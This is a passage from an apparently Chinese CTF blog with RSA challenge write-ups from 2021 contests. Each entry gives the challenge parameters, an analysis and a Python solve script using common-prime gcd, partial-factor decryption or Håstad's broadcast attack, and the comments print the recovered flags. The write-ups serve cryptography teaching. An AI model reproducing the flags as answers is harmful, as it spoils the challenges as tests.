id="分析-2"><a class="markdownIt-Anchor" href="#分析-2"></a> 分析</h2><p>给了n,e,c</p><p>可以直接分解n,得到三个因数,记为p,q,r</p><p>可以发现直接计算phi_n是跟n不互素的，无法求解d，这时候我们就利用n的因子，也是可以求解的，具体原理跟用n解密是一样的过程，利用费马小定理。</p><p>这里看p,q,r的欧拉函数跟e哪个是互素，可以发现p,r和e互素的，这里我们就计算p*r的欧拉函数跟e进行求解d，然后就是正常的rsa解密</p><h2 id="exp-2"><a class="markdownIt-Anchor" href="#exp-2"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> factordb.factordb <span class="hljs-keyword">import</span> FactorDB<br>n = <span class="hljs-number">3454083680130687060405946528826790951695785465926614724373</span><br>f=FactorDB(n)<br>f.connect()<br>p,q,r=f.get_factor_list()<br>e = <span class="hljs-number">3</span><br>c = <span class="hljs-number">1347530713288996422676156069761604101177635382955634367208</span><br><br><span class="hljs-built_in">print</span>(gcd(e,p-<span class="hljs-number">1</span>)) <span class="hljs-comment">#1</span><br><span class="hljs-built_in">print</span>(gcd(e,q-<span class="hljs-number">1</span>)) <span class="hljs-comment">#3</span><br><span class="hljs-built_in">print</span>(gcd(e,r-<span class="hljs-number">1</span>)) <span class="hljs-comment">#1</span><br><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c,invert(e,(p-<span class="hljs-number">1</span>)*(r-<span class="hljs-number">1</span>)),p*r)))<br></code></pre></td></tr></table></figure><h1 id="羊城杯-2021bigrsa"><a class="markdownIt-Anchor" href="#羊城杯-2021bigrsa"></a> [羊城杯 2021]Bigrsa</h1><h2 id="题目-3"><a class="markdownIt-Anchor" href="#题目-3"></a> 题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> *<br><br>n1 = <span class="hljs-number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span><br>n2 = <span class="hljs-number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span><br>e = <span class="hljs-number">65537</span><br>m = bytes_to_long(flag)<br>c = <span class="hljs-built_in">pow</span>(m, e, n1)<br>c = <span class="hljs-built_in">pow</span>(c, e, n2)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c = %d&quot;</span> % c)<br><br><span class="hljs-comment"># output</span><br><span class="hljs-comment"># c = 60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span><br></code></pre></td></tr></table></figure><h2 id="分析-3"><a class="markdownIt-Anchor" href="#分析-3"></a> 分析</h2><p>给了我们两个n，一般这种时候我们就可以知道是公用素数问题了，求解n1和n2的公约数就可以求解出一个素数</p><p>然后c是经过了两次rsa加密，求解两次就好了</p><h2 id="exp-3"><a class="markdownIt-Anchor" href="#exp-3"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;from Crypto.Util.number import *</span><br><span class="hljs-string">from flag import *</span><br><span class="hljs-string"></span><br><span class="hljs-string">n1 = 103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span><br><span class="hljs-string">n2 = 115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span><br><span class="hljs-string">e = 65537</span><br><span class="hljs-string">m = bytes_to_long(flag)</span><br><span class="hljs-string">c = pow(m, e, n1)</span><br><span class="hljs-string">c = pow(c, e, n2)</span><br><span class="hljs-string"></span><br><span class="hljs-string">print(&quot;c = %d&quot; % c)</span><br><span class="hljs-string"></span><br><span class="hljs-string"># output</span><br><span class="hljs-string"># c = 60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>n1 = <span class="hljs-number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span><br>n2 = <span class="hljs-number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span><br>p=gcd(n1,n2)<br><br><span class="hljs-keyword">if</span> p != <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> isPrime(p):<br>    c1=<span class="hljs-built_in">pow</span>(c,invert(e,(p-<span class="hljs-number">1</span>)*(n2//p-<span class="hljs-number">1</span>)),n2)<br>    <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c1,invert(e,(p-<span class="hljs-number">1</span>)*(n1//p-<span class="hljs-number">1</span>)),n1)))<br><span class="hljs-comment">#b&#x27;SangFor&#123;qSccmm1WrgvIg2Uq_cZhmqNfEGTz2GV8&#125;&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;qSccmm1WrgvIg2Uq_cZhmqNfEGTz2GV8&#125;</span><br><br></code></pre></td></tr></table></figure><h1 id="闽盾杯-2021decode"><a class="markdownIt-Anchor" href="#闽盾杯-2021decode"></a> [闽盾杯 2021]decode</h1><h2 id="题目-4"><a class="markdownIt-Anchor" href="#题目-4"></a> 题目</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">n1:</span><br><span class="hljs-number">15228664629164509105936278301396170708905691970126305196584505186788860519598413718493859625462561931380632032431490419378905593909771649295663481782473029836321132574188559245931660756414915507930357509270674460219615256962333464689419869130366867401404262606367700782040693275068101244535880649261286041921882470460606034302142183971677715439862839410834231609821777031530457674591868138859358815039755085358568037032478394036448363183057305077227769673701227083943898736796552550712057417053897722979700329662099072959306298177351997084389916443815546425080826441671985030755256185725913397986385179516049927425591</span><br><span class="hljs-symbol">n2:</span><br><span class="hljs-number">28182418532443955655250943929828439725377604572088962537896240628709829618999901367131159759359513146864646169253348651905865895468151210748207509325666501438590382812326109260537618829438786609626137074778638549998280533912080708785604673270460635181275360847313985764185991865570533815651261638439461846512012164531330949433517277559149828806588070421852157781670188281908625986974579194819272643409859915715455134433970119584552350648013116998668938513347083566970423327936691885137812528912263666957628197241313496232397910546498542303925205356813548741679943691886217742767778075067797422624969714343428365022749</span><br><span class="hljs-symbol">n3:</span><br><span class="hljs-number">18355811159408154065817199279776805621878757240392366715869421799780946779485225342662736231980532326015283372375030686507311099745671828649419794838611580909610100636296701054995302819692794479292794716441442731393027118795245239019609474743841061251498233337758043553376098591254587406941205804917663153256036922860462415387926973551020540123742773938055950168965005226319984869124543783579240130888344231027912143592472823564266887957101575622993773291455143915263715932280728961208233983782906070719786115187115449430196335973764600533097718947377609348244073036523422892353195107093782201003551217830556519184839</span><br><span class="hljs-symbol">e1:</span><br><span class="hljs-number">65537</span><br><span class="hljs-symbol">e2:</span><br><span class="hljs-number">27751</span><br><span class="hljs-symbol">e3:</span><br><span class="hljs-number">65537</span><br><span class="hljs-symbol">c1:</span><br><span class="hljs-number">5368342382489380107251269030258282008067103595899117880173297169710980852124379736420135829984131832023988667774795223808420069001078159756328642298736759964890517323144475742861501409284299556459601222657540302786301791897975932176538612601162552795835603779910738886150925504885639254302406755008796950704938463132687940418772021406619622090999564746948113296328739593309200238996686945891130656599419832796482095787039339269564880847130379179831744694000940207887150388411084465949903406848727641093033681144598595895383689139227400553234701993087147186292040330589331703587405822925483701667354935313494938769206</span><br><span class="hljs-symbol">c2:</span><br><span class="hljs-number">21521672635651854919517759696514027081496995002884626306313384597771682621826437868933822942195279941318573525337109548152966094293276717095298929811895186384560362917891928656637913236676702009205642367801075592458101830488916914437754803979953027152373619293870115731171449223105986403604973873007338969000153480949617700626516389419935352576014084068271819009465242491467427642787306345049280205827574043586767133396458785487959251540831856187380154825027964867977651727983254127239427622549059938701125498520279503972702883327594442747467858234391945790597844344295786118320620376681461727686876948563884520137741</span><br><span class="hljs-symbol">c3:</span><br><span class="hljs-number">13940747781246179701167820858098775936269078279837839169409057305686612176371099274767269714494905207551971162649902129137425806839867713157472497469542260664882313041602553845621113546259276402534229231780532278276697961222319054833980226978574905974878218905613341365260453461080117407529132948986104191917111000811731784483944945364091757083949827612260904757837644538366763161154611658652020868326985526984718638276184626634240096213703958275241215175054246685206226179114590838833694648062135027841593419815101363262701960507235056752424778384286627997500871204804629047307688466887868894491042058198480775705486</span><br></code></pre></td></tr></table></figure><h2 id="分析-4"><a class="markdownIt-Anchor" href="#分析-4"></a> 分析</h2><p>跟上题一样的思路，公用素数问题</p><p>p足够大就直接用p解密了</p><h2 id="exp-4"><a class="markdownIt-Anchor" href="#exp-4"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>n1=<span class="hljs-number">15228664629164509105936278301396170708905691970126305196584505186788860519598413718493859625462561931380632032431490419378905593909771649295663481782473029836321132574188559245931660756414915507930357509270674460219615256962333464689419869130366867401404262606367700782040693275068101244535880649261286041921882470460606034302142183971677715439862839410834231609821777031530457674591868138859358815039755085358568037032478394036448363183057305077227769673701227083943898736796552550712057417053897722979700329662099072959306298177351997084389916443815546425080826441671985030755256185725913397986385179516049927425591</span><br>n2=<span class="hljs-number">28182418532443955655250943929828439725377604572088962537896240628709829618999901367131159759359513146864646169253348651905865895468151210748207509325666501438590382812326109260537618829438786609626137074778638549998280533912080708785604673270460635181275360847313985764185991865570533815651261638439461846512012164531330949433517277559149828806588070421852157781670188281908625986974579194819272643409859915715455134433970119584552350648013116998668938513347083566970423327936691885137812528912263666957628197241313496232397910546498542303925205356813548741679943691886217742767778075067797422624969714343428365022749</span><br>n3=<span class="hljs-number">18355811159408154065817199279776805621878757240392366715869421799780946779485225342662736231980532326015283372375030686507311099745671828649419794838611580909610100636296701054995302819692794479292794716441442731393027118795245239019609474743841061251498233337758043553376098591254587406941205804917663153256036922860462415387926973551020540123742773938055950168965005226319984869124543783579240130888344231027912143592472823564266887957101575622993773291455143915263715932280728961208233983782906070719786115187115449430196335973764600533097718947377609348244073036523422892353195107093782201003551217830556519184839</span><br>e1=<span class="hljs-number">65537</span><br>e2=<span class="hljs-number">27751</span><br>e3=<span class="hljs-number">65537</span><br>c1=<span class="hljs-number">5368342382489380107251269030258282008067103595899117880173297169710980852124379736420135829984131832023988667774795223808420069001078159756328642298736759964890517323144475742861501409284299556459601222657540302786301791897975932176538612601162552795835603779910738886150925504885639254302406755008796950704938463132687940418772021406619622090999564746948113296328739593309200238996686945891130656599419832796482095787039339269564880847130379179831744694000940207887150388411084465949903406848727641093033681144598595895383689139227400553234701993087147186292040330589331703587405822925483701667354935313494938769206</span><br>c2=<span class="hljs-number">21521672635651854919517759696514027081496995002884626306313384597771682621826437868933822942195279941318573525337109548152966094293276717095298929811895186384560362917891928656637913236676702009205642367801075592458101830488916914437754803979953027152373619293870115731171449223105986403604973873007338969000153480949617700626516389419935352576014084068271819009465242491467427642787306345049280205827574043586767133396458785487959251540831856187380154825027964867977651727983254127239427622549059938701125498520279503972702883327594442747467858234391945790597844344295786118320620376681461727686876948563884520137741</span><br>c3=<span class="hljs-number">13940747781246179701167820858098775936269078279837839169409057305686612176371099274767269714494905207551971162649902129137425806839867713157472497469542260664882313041602553845621113546259276402534229231780532278276697961222319054833980226978574905974878218905613341365260453461080117407529132948986104191917111000811731784483944945364091757083949827612260904757837644538366763161154611658652020868326985526984718638276184626634240096213703958275241215175054246685206226179114590838833694648062135027841593419815101363262701960507235056752424778384286627997500871204804629047307688466887868894491042058198480775705486</span><br><br>p1=gcd(n1,n2)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c1,invert(e1,p1-<span class="hljs-number">1</span>),p1)))<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c2,invert(e2,p1-<span class="hljs-number">1</span>),p1)))<br><span class="hljs-comment">#b&quot;hahaha, you&#x27;ve got the flag didn&#x27;t you !the front part is :flag&#123;G00d_w4&quot;</span><br><span class="hljs-comment">#b&quot;hahaha, you&#x27;ve got the flag didn&#x27;t you !the middle part is :y_tO_cR&quot;</span><br>p3=gcd(n3,n2)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c3,invert(e3,p3-<span class="hljs-number">1</span>),p3)))<br><span class="hljs-comment">#b&quot;hahaha, you&#x27;ve got the flag didn&#x27;t you !the last part is :4ck_RS4&#125;&quot;</span><br><span class="hljs-comment">#flag&#123;G00d_w4y_tO_cR4ck_RS4&#125;</span><br><span class="hljs-comment">#NSSCTF&#123;G00d_w4y_tO_cR4ck_RS4&#125;</span><br></code></pre></td></tr></table></figure><h1 id="鹤城杯-2021crazy_rsa_tech"><a class="markdownIt-Anchor" href="#鹤城杯-2021crazy_rsa_tech"></a> [鹤城杯 2021]Crazy_Rsa_Tech</h1><h2 id="题目-5"><a class="markdownIt-Anchor" href="#题目-5"></a> 题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> *<br><br>FLAG = bytes_to_long(pad(<span class="hljs-string">b&quot;flag&#123;??????&#125;&quot;</span>,<span class="hljs-number">64</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_key</span>():<br>    p, q = getPrime(<span class="hljs-number">512</span>), getPrime(<span class="hljs-number">512</span>)<br>    n = p*q<br>    e = <span class="hljs-number">9</span><br>    <span class="hljs-keyword">while</span>(GCD((p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>),e)!=<span class="hljs-number">1</span>):<br>        p, q = getPrime(<span class="hljs-number">512</span>), getPrime(<span class="hljs-number">512</span>)<br>        n = p*q<br>    d = inverse(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">return</span> n,e,d<br><br>n_list=<span class="hljs-built_in">list</span>()<br>c_list=<span class="hljs-built_in">list</span>()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    N,e,d=init_key()<br>    n_list.append(N)<br>    c=<span class="hljs-built_in">pow</span>(FLAG,e,N)<br>    c_list.append(<span class="hljs-built_in">pow</span>(FLAG,e,N))<br>    <span class="hljs-keyword">assert</span>(<span class="hljs-built_in">pow</span>(c,d,N)==FLAG)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n_list:&quot;</span>,n_list)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c_list:&quot;</span>,c_list)<br></code></pre></td></tr></table></figure><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">n_list: <span class="hljs-string">[71189786319102608575263218254922479901008514616376166401353025325668690465852130559783959409002115897148828732231478529655075366072137059589917001875303598680931962384468363842379833044123189276199264340224973914079447846845897807085694711541719515881377391200011269924562049643835131619086349617062034608799, 92503831027754984321994282254005318198418454777812045042619263533423066848097985191386666241913483806726751133691867010696758828674382946375162423033994046273252417389169779506788545647848951018539441971140081528915876529645525880324658212147388232683347292192795975558548712504744297104487514691170935149949, 100993952830138414466948640139083231443558390127247779484027818354177479632421980458019929149817002579508423291678953554090956334137167905685261724759487245658147039684536216616744746196651390112540237050493468689520465897258378216693418610879245129435268327315158194612110422630337395790254881602124839071919, 59138293747457431012165762343997972673625934330232909935732464725128776212729547237438509546925172847581735769773563840639187946741161318153031173864953372796950422229629824699580131369991913883136821374596762214064774480548532035315344368010507644630655604478651898097886873485265848973185431559958627423847, 66827868958054485359731420968595906328820823695638132426084478524423658597714990545142120448668257273436546456116147999073797943388584861050133103137697812149742551913704341990467090049650721713913812069904136198912314243175309387952328961054617877059134151915723594900209641163321839502908705301293546584147, 120940513339890268554625391482989102665030083707530690312336379356969219966820079510946652021721814016286307318930536030308296265425674637215009052078834615196224917417698019787514831973471113022781129000531459800329018133248426080717653298100515701379374786486337920294380753805825328119757649844054966712377, 72186594495190221129349814154999705524005203343018940547856004977368023856950836974465616291478257156860734574686154136925776069045232149725101769594505766718123155028300703627531567850035682448632166309129911061492630709698934310123778699316856399909549674138453085885820110724923723830686564968967391721281, 69105037583161467265649176715175579387938714721653281201847973223975467813529036844308693237404592381480367515044829190066606146105800243199497182114398931410844901178842049915914390117503986044951461783780327749665912369177733246873697481544777183820939967036346862056795919812693669387731294595126647751951, 76194219445824867986050004226602973283400885106636660263597964027139613163638212828932901192009131346530898961165310615466747046710743013409318156266326090650584190382130795884514074647833949281109675170830565650006906028402714868781834693473191228256626654011772428115359653448111208831188721505467497494581]</span><br>c_list: <span class="hljs-string">[62580922178008480377006528793506649089253164524883696044759651305970802215270721223149734532870729533611357047595181907404222690394917605617029675103788705320032707977225447998111744887898039756375876685711148857676502670812333076878964148863713993853526715855758799502735753454247721711366497722251078739585, 46186240819076690248235492196228128599822002268014359444368898414937734806009161030424589993541799877081745454934484263188270879142125136786221625234555265815513136730416539407710862948861531339065039071959576035606192732936477944770308784472646015244527805057990939765708793705044236665364664490419874206900, 85756449024868529058704599481168414715291172247059370174556127800630896693021701121075838517372920466708826412897794900729896389468152213884232173410022054605870785910461728567377769960823103334874807744107855490558726013068890632637193410610478514663078901021307258078678427928255699031215654693270240640198, 14388767329946097216670270960679686032536707277732968784379505904021622612991917314721678940833050736745004078559116326396233622519356703639737886289595860359630019239654690312132039876082685046329079266785042428947147658321799501605837784127004536996628492065409017175037161261039765340032473048737319069656, 1143736792108232890306863524988028098730927600066491485326214420279375304665896453544100447027809433141790331191324806205845009336228331138326163746853197990596700523328423791764843694671580875538251166864957646807184041817863314204516355683663859246677105132100377322669627893863885482167305919925159944839, 2978800921927631161807562509445310353414810029862911925227583943849942080514132963605492727604495513988707849133045851539412276254555228149742924149242124724864770049898278052042163392380895275970574317984638058768854065506927848951716677514095183559625442889028813635385408810698294574175092159389388091981, 16200944263352278316040095503540249310705602580329203494665614035841657418101517016718103326928336623132935178377208651067093136976383774189554806135146237406248538919915426183225265103769259990252162411307338473817114996409705345401251435268136647166395894099897737607312110866874944619080871831772376466376, 31551601425575677138046998360378916515711528548963089502535903329268089950335615563205720969393649713416910860593823506545030969355111753902391336139384464585775439245735448030993755229554555004154084649002801255396359097917380427525820249562148313977941413268787799534165652742114031759562268691233834820996, 25288164985739570635307839193110091356864302148147148153228604718807817833935053919412276187989509493755136905193728864674684139319708358686431424793278248263545370628718355096523088238513079652226028236137381367215156975121794485995030822902933639803569133458328681148758392333073624280222354763268512333515]</span><br></code></pre></td></tr></table></figure><h2 id="分析-5"><a class="markdownIt-Anchor" href="#分析-5"></a> 分析</h2><p>多个n对一个明文进行加密，而且e比较小，可以用中国剩余定理求解，求解出来是m<sup>e</sup>，然后再开根就好了</p><p>（另外如果e比较大n比较多，还有一种是广播攻击，也是共用素数的一种，用O(n<sup>2</sup>)的时间去嵌套遍历n_list，看看有没有公用的素数）</p><h2 id="exp-5"><a class="markdownIt-Anchor" href="#exp-5"></a> exp</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> Crypto.Util.number import *<br><span class="hljs-attribute">from</span> gmpy2 import *<br><span class="hljs-attribute">from</span> sympy.ntheory.modular import crt<br><span class="hljs-attribute">n_list</span>=[<span class="hljs-number">71189786319102608575263218254922479901008514616376166401353025325668690465852130559783959409002115897148828732231478529655075366072137059589917001875303598680931962384468363842379833044123189276199264340224973914079447846845897807085694711541719515881377391200011269924562049643835131619086349617062034608799</span>, <span class="hljs-number">92503831027754984321994282254005318198418454777812045042619263533423066848097985191386666241913483806726751133691867010696758828674382946375162423033994046273252417389169779506788545647848951018539441971140081528915876529645525880324658212147388232683347292192795975558548712504744297104487514691170935149949</span>, <span class="hljs-number">100993952830138414466948640139083231443558390127247779484027818354177479632421980458019929149817002579508423291678953554090956334137167905685261724759487245658147039684536216616744746196651390112540237050493468689520465897258378216693418610879245129435268327315158194612110422630337395790254881602124839071919</span>, <span class="hljs-number">59138293747457431012165762343997972673625934330232909935732464725128776212729547237438509546925172847581735769773563840639187946741161318153031173864953372796950422229629824699580131369991913883136821374596762214064774480548532035315344368010507644630655604478651898097886873485265848973185431559958627423847</span>, <span class="hljs-number">66827868958054485359731420968595906328820823695638132426084478524423658597714990545142120448668257273436546456116147999073797943388584861050133103137697812149742551913704341990467090049650721713913812069904136198912314243175309387952328961054617877059134151915723594900209641163321839502908705301293546584147</span>, <span class="hljs-number">120940513339890268554625391482989102665030083707530690312336379356969219966820079510946652021721814016286307318930536030308296265425674637215009052078834615196224917417698019787514831973471113022781129000531459800329018133248426080717653298100515701379374786486337920294380753805825328119757649844054966712377</span>, <span class="hljs-number">72186594495190221129349814154999705524005203343018940547856004977368023856950836974465616291478257156860734574686154136925776069045232149725101769594505766718123155028300703627531567850035682448632166309129911061492630709698934310123778699316856399909549674138453085885820110724923723830686564968967391721281</span>, <span class="hljs-number">69105037583161467265649176715175579387938714721653281201847973223975467813529036844308693237404592381480367515044829190066606146105800243199497182114398931410844901178842049915914390117503986044951461783780327749665912369177733246873697481544777183820939967036346862056795919812693669387731294595126647751951</span>, <span class="hljs-number">76194219445824867986050004226602973283400885106636660263597964027139613163638212828932901192009131346530898961165310615466747046710743013409318156266326090650584190382130795884514074647833949281109675170830565650006906028402714868781834693473191228256626654011772428115359653448111208831188721505467497494581</span>]<br><span class="hljs-attribute">c_list</span>=[<span class="hljs-number">62580922178008480377006528793506649089253164524883696044759651305970802215270721223149734532870729533611357047595181907404222690394917605617029675103788705320032707977225447998111744887898039756375876685711148857676502670812333076878964148863713993853526715855758799502735753454247721711366497722251078739585</span>, <span class="hljs-number">46186240819076690248235492196228128599822002268014359444368898414937734806009161030424589993541799877081745454934484263188270879142125136786221625234555265815513136730416539407710862948861531339065039071959576035606192732936477944770308784472646015244527805057990939765708793705044236665364664490419874206900</span>, <span class="hljs-number">85756449024868529058704599481168414715291172247059370174556127800630896693021701121075838517372920466708826412897794900729896389468152213884232173410022054605870785910461728567377769960823103334874807744107855490558726013068890632637193410610478514663078901021307258078678427928255699031215654693270240640198</span>, <span class="hljs-number">14388767329946097216670270960679686032536707277732968784379505904021622612991917314721678940833050736745004078559116326396233622519356703639737886289595860359630019239654690312132039876082685046329079266785042428947147658321799501605837784127004536996628492065409017175037161261039765340032473048737319069656</span>, <span class="hljs-number">1143736792108232890306863524988028098730927600066491485326214420279375304665896453544100447027809433141790331191324806205845009336228331138326163746853197990596700523328423791764843694671580875538251166864957646807184041817863314204516355683663859246677105132100377322669627893863885482167305919925159944839</span>, <span class="hljs-number">2978800921927631161807562509445310353414810029862911925227583943849942080514132963605492727604495513988707849133045851539412276254555228149742924149242124724864770049898278052042163392380895275970574317984638058768854065506927848951716677514095183559625442889028813635385408810698294574175092159389388091981</span>, <span class="hljs-number">16200944263352278316040095503540249310705602580329203494665614035841657418101517016718103326928336623132935178377208651067093136976383774189554806135146237406248538919915426183225265103769259990252162411307338473817114996409705345401251435268136647166395894099897737607312110866874944619080871831772376466376</span>, <span class="hljs-number">31551601425575677138046998360378916515711528548963089502535903329268089950335615563205720969393649713416910860593823506545030969355111753902391336139384464585775439245735448030993755229554555004154084649002801255396359097917380427525820249562148313977941413268787799534165652742114031759562268691233834820996</span>, <span class="hljs-number">25288164985739570635307839193110091356864302148147148153228604718807817833935053919412276187989509493755136905193728864674684139319708358686431424793278248263545370628718355096523088238513079652226028236137381367215156975121794485995030822902933639803569133458328681148758392333073624280222354763268512333515</span>]<br><span class="hljs-attribute">e</span>=<span class="hljs-number">9</span><br><span class="hljs-attribute">m</span>=crt(n_list,c_list)[<span class="hljs-number">0</span>]<br><span class="hljs-attribute">print</span>(long_to_bytes(iroot(m,e)[<span class="hljs-number">0</span>]))<br><span class="hljs-comment">#b&#x27;flag&#123;H0w_Fun_13_HAstads_broadca5t_AtTack!&#125;\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;H0w_Fun_13_HAstads_broadca5t_AtTack!&#125;</span><br></code></pre></td></tr></table></figure><h1 id="广东强网杯-2021-个人组ezrsa"><a class="markdownIt-Anchor" href="#广东强网杯-2021-个人组ezrsa"></a> [广东强网杯 2021 个人组]EzRSA</h1><h2 id="题目-6"><a class="markdownIt-Anchor" href="#题目-6"></a> 题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 